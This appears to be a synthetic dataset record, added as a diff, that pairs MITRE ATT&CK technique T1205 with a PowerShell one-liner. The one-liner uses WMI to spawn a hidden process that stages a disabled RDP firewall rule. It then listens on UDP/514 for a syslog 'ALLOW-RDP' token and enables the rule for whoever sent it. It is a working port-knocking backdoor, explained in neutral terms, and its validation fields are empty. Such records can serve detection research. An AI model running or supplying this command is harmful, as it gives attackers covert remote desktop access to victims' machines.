@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -NoP -W Hidden -Command & { if (-not (Get-NetFirewallRule -DisplayName ''Signal-Open-RDP-Syslog'' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName ''Signal-Open-RDP-Syslog'' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389 -Enabled False } else { Set-NetFirewallRule -DisplayName ''Signal-Open-RDP-Syslog'' -Enabled False }; $u=New-Object System.Net.Sockets.UdpClient(514); $ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0); while($true){ $d=$u.Receive([ref]$ep); $s=[Text.Encoding]::ASCII.GetString($d); if($s -like ''*ALLOW-RDP*''){ Set-NetFirewallRule -DisplayName ''Signal-Open-RDP-Syslog'' -Enabled True -RemoteAddress $ep.Address; break } } }'",
+  "explanation": "Listens for syslog messages on UDP/514 from network devices and searches for the token 'ALLOW-RDP' in the message body. This application-specific signal enables the RDP firewall rule for the emitter.",
+  "rationale_steps": [
+    "Create disabled inbound rule for TCP/3389.",
+    "Bind to UDP/514 and parse syslog messages for a sentinel token.",
+    "If token is present, enable the rule and constrain to that sender's IP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-5411a282-e84f5cf9",
+  "source_prompt_hash": "5411a282",
+  "timestamp_utc": "2025-09-30T03:46:23.408122Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
